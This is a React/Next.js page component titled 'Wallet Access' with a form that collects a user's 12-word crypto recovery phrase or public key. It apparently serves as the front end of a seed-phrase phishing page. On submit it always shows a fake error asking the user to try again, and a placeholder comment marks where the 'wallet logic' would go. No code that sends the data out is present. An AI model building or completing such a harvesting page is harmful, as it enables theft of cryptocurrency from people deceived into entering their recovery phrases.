"use client";

import Header from "@/components/Header";
import { useState, useRef } from "react";
import { toast } from "sonner";

export default function WalletAccessPage() {
  const [inputType, setInputType] = useState<"phrase" | "publicKey">("phrase");
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
  const [inputValue, setInputValue] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    const trimmed = value.trim();

    // If a space was typed, split and auto-fill next box
    if (value.includes(" ")) {
      const words = value.trim().split(/\s+/);
      const newWords = [...phraseWords];

      for (let i = 0; i < words.length; i++) {
        const targetIndex = index + i;
        if (targetIndex < 12) {
          newWords[targetIndex] = words[i];
        }
      }

      setPhraseWords(newWords);
      const next = index + words.length;
      if (next < 12) {
        inputRefs.current[next]?.focus();
      }

      return;
    }

    // Normal typing: just update the current word
    const newWords = [...phraseWords];
    newWords[index] = trimmed;
    setPhraseWords(newWords);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pasteText = e.clipboardData.getData("text");
    const words = pasteText.trim().split(/\s+/);

    if (words.length === 12) {
      e.preventDefault();
      setPhraseWords(words.slice(0, 12));
      inputRefs.current[1]?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (inputType === "phrase") {
      const seedPhrase = phraseWords.join(" ").trim();
      if (phraseWords.some((word) => word === "")) {
        toast.error("Please fill all 12 words");
        return;
      }
      // Handle wallet logic here
      alert(`Seed Phrase:\n${seedPhrase}`);
      // ✅ Show success toast
      toast.error("An error occured", {
        description:
          "There was an error while submitting phrase please try again",
      });
      return;
    }

    if (inputType === "publicKey") {
      if (!inputValue.trim()) {
        toast.error("Please enter your public key");
        return;
      }
      toast.error("An error occured", {
        description:
          "There was an error while submitting public key please try again",
      });
      return;
    }
  };

  return (
    <main className="min-h-screen bg-gray-900 text-white flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-gray-800 p-6 rounded-2xl shadow-lg space-y-6">
        <h1 className="text-2xl font-bold text-center">Wallet Access</h1>

        <div className="flex space-x-2">
          <button
            className={`w-1/2 py-2 rounded-lg text-sm font-medium ${
              inputType === "phrase"
                ? "bg-primary text-black"
                : "bg-gray-700 hover:bg-gray-600"
            }`}
            onClick={() => setInputType("phrase")}
          >
            Seed Phrase
          </button>
          <button
            className={`w-1/2 py-2 rounded-lg text-sm font-medium ${
              inputType === "publicKey"
                ? "bg-primary text-black"
                : "bg-gray-700 hover:bg-gray-600"
            }`}
            onClick={() => setInputType("publicKey")}
          >
            Public Key
          </button>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          {inputType === "phrase" ? (
            <>
              <p className="text-sm text-center text-gray-400">
                Enter your 12-word recovery phrase
              </p>
              <div className="grid grid-cols-3 gap-3">
                {phraseWords.map((word, index) => (
                  <input
                    key={index}
                    type="text"
                    className="bg-gray-700 p-2 rounded text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                    placeholder={`${index + 1}`}
                    value={word}
                    ref={(el) => {
                      inputRefs.current[index] = el;
                    }}
                    onChange={(e) => handleChange(index, e.target.value)}
                    onPaste={handlePaste}
                    // onPaste={index === 0 ? handlePaste : undefined} // Only allow pasting in the first input
                    autoComplete="off"
                  />
                ))}
              </div>
            </>
          ) : (
            <input
              type="text"
              placeholder="Enter public key"
              className="w-full p-3 bg-gray-700 rounded-md focus:outline-none focus:ring-2 focus:ring-primary text-sm"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              required
            />
          )}

          <button
            type="submit"
            className="w-full bg-primary/85 text-black py-2 rounded-md font-semibold hover:bg-primary transition"
          >
            Access Wallet
          </button>
        </form>
      </div>
    </main>
  );
}
